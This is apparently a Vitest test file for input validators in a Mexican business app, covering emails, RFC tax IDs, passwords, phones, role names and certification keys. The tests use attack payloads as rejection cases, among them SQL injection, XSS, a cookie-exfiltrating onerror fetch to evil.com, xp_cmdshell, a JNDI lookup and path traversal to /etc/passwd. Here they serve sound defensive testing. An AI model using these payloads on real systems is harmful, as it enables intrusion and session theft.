import { describe, it, expect } from "vitest";
import {
  isValidRFC,
  isValidEmail,
  isValidPhone,
  isValidCertificationKey,
  validatePassword,
  validateRoleName,
} from "@/lib/validation";

describe("Security: Input Validation", () => {
  describe("Email validation", () => {
    it("accepts valid emails", () => {
      expect(isValidEmail("user@example.com")).toBe(true);
      expect(isValidEmail("a@b.co")).toBe(true);
      expect(isValidEmail("test.user+tag@domain.mx")).toBe(true);
    });

    it("rejects emails with SQL injection patterns", () => {
      expect(isValidEmail("' OR '1'='1")).toBe(false);
      expect(isValidEmail("'; DROP TABLE users; --")).toBe(false);
      expect(isValidEmail("admin'--")).toBe(false);
      expect(isValidEmail("' UNION SELECT * FROM users--")).toBe(false);
    });

    it("rejects emails with XSS patterns", () => {
      expect(isValidEmail('<script>alert("xss")</script>')).toBe(false);
      expect(isValidEmail("user@evil.com<img src=x onerror=alert(1)>")).toBe(false);
      expect(isValidEmail('"><script>document.cookie</script>')).toBe(false);
    });

    it("rejects emails with null bytes", () => {
      expect(isValidEmail("user@domain.com\u0000")).toBe(false);
      expect(isValidEmail("\u0000user@domain.com")).toBe(false);
      expect(isValidEmail("user@domain\u0000.com")).toBe(false);
    });

    it("rejects malformed emails", () => {
      expect(isValidEmail("")).toBe(false);
      expect(isValidEmail("not-an-email")).toBe(false);
      expect(isValidEmail("@no-local.com")).toBe(false);
      expect(isValidEmail("no-domain@")).toBe(false);
      expect(isValidEmail("spaces in@email.com")).toBe(false);
      expect(isValidEmail("a".repeat(255) + "@test.com")).toBe(false);
    });

    it("rejects emails with whitespace injection inside email", () => {
      expect(isValidEmail("user @domain.com")).toBe(false);
      expect(isValidEmail("user@ domain.com")).toBe(false);
    });
  });

  describe("RFC validation (Mexican tax ID)", () => {
    it("accepts valid RFC patterns", () => {
      expect(isValidRFC("ABC123456XYZ")).toBe(true);
      expect(isValidRFC("ABCD123456XYZ")).toBe(true);
      expect(isValidRFC("ÑABC123456X01")).toBe(true);
    });

    it("rejects SQL injection in RFC", () => {
      expect(isValidRFC("'; DROP TABLE--")).toBe(false);
      expect(isValidRFC("123' OR '1'='1")).toBe(false);
    });

    it("rejects XSS in RFC", () => {
      expect(isValidRFC("<script>alert(1)</script>")).toBe(false);
      expect(isValidRFC('" onclick=alert(1)')).toBe(false);
    });

    it("rejects excessively long RFC strings", () => {
      expect(isValidRFC("A".repeat(100))).toBe(false);
    });

    it("rejects empty RFC", () => {
      expect(isValidRFC("")).toBe(false);
    });

    it("rejects RFC with special characters", () => {
      expect(isValidRFC("ABC-123456-XYZ")).toBe(false);
      expect(isValidRFC("ABC;123456XYZ")).toBe(false);
    });
  });

  describe("Password validation", () => {
    it("requires minimum 6 characters", () => {
      const result = validatePassword("abc12");
      expect(result.valid).toBe(false);
      expect(result.errors).toContain("Mínimo 6 caracteres");
    });

    it("accepts valid passwords", () => {
      const result = validatePassword("Str0ngP@ssw0rd!");
      expect(result.valid).toBe(true);
      expect(result.errors).toHaveLength(0);
    });

    it("rejects empty passwords", () => {
      const result = validatePassword("");
      expect(result.valid).toBe(false);
    });

    it("rejects passwords exceeding max length", () => {
      const longPwd = "a".repeat(73);
      const result = validatePassword(longPwd);
      expect(result.valid).toBe(false);
      expect(result.errors).toContain("Máximo 72 caracteres");
    });

    it("allows passwords with special characters", () => {
      const result = validatePassword("P@ss!卡ñ😀");
      expect(result.valid).toBe(true);
    });
  });

  describe("Phone validation", () => {
    it("accepts valid phone numbers", () => {
      expect(isValidPhone("+521234567890")).toBe(true);
      expect(isValidPhone("1234567890")).toBe(true);
    });

    it("rejects phone numbers with letters", () => {
      expect(isValidPhone("123ABC7890")).toBe(false);
    });

    it("rejects short phone numbers", () => {
      expect(isValidPhone("12345")).toBe(false);
    });

    it("rejects extremely long phone numbers", () => {
      expect(isValidPhone("1".repeat(100))).toBe(false);
    });
  });

  describe("Role name validation", () => {
    it("rejects blocked system role names", () => {
      expect(validateRoleName("admin").valid).toBe(false);
      expect(validateRoleName("superadmin").valid).toBe(false);
      expect(validateRoleName("root").valid).toBe(false);
      expect(validateRoleName("owner").valid).toBe(false);
      expect(validateRoleName("ceo").valid).toBe(false);
      expect(validateRoleName("sistema").valid).toBe(false);
      expect(validateRoleName("system").valid).toBe(false);
    });

    it("rejects role names containing blocked words", () => {
      expect(validateRoleName("my_admin_role").valid).toBe(false);
      expect(validateRoleName("super_root_user").valid).toBe(false);
    });

    it("accepts legitimate role names", () => {
      expect(validateRoleName("Ventas").valid).toBe(true);
      expect(validateRoleName("Soporte Técnico").valid).toBe(true);
      expect(validateRoleName("Gerente Regional").valid).toBe(true);
    });

    it("rejects empty role names", () => {
      expect(validateRoleName("").valid).toBe(false);
    });

    it("rejects excessively long role names", () => {
      const longName = "A".repeat(101);
      expect(validateRoleName(longName).valid).toBe(false);
    });
  });

  describe("Certification key validation", () => {
    it("accepts valid certification keys", () => {
      expect(isValidCertificationKey("ABC123KEY")).toBe(true);
    });

    it("rejects too-short certification keys", () => {
      expect(isValidCertificationKey("AB")).toBe(false);
    });

    it("rejects too-long certification keys", () => {
      expect(isValidCertificationKey("A".repeat(101))).toBe(false);
    });

    it("rejects empty certification keys", () => {
      expect(isValidCertificationKey("")).toBe(false);
    });
  });

  describe("Combined attack vectors", () => {
    const attackPayloads = [
      "' OR '1'='1",
      "'; DROP TABLE users; --",
      "<script>alert(document.cookie)</script>",
      "<img src=x onerror=fetch('https://evil.com?c='+document.cookie)>",
      "javascript:alert(1)",
      "'; EXEC xp_cmdshell('dir');--",
      "${jndi:ldap://evil.com/a}",
      "__proto__",
      "constructor",
      "../../../../etc/passwd",
      "\\x00",
    ];

    it("email validator rejects all attack payloads", () => {
      for (const payload of attackPayloads) {
        expect(isValidEmail(payload)).toBe(false);
      }
    });

    it("RFC validator rejects all attack payloads", () => {
      for (const payload of attackPayloads) {
        expect(isValidRFC(payload)).toBe(false);
      }
    });

    it("role validator blocks dangerous names", () => {
      const dangerous = [
        "admin",
        "superadmin",
        "root",
        "Admin",
        "SuperAdmin",
        "SYSTEM",
        "administrator",
      ];
      for (const name of dangerous) {
        expect(validateRoleName(name).valid).toBe(false);
      }
    });
  });
});
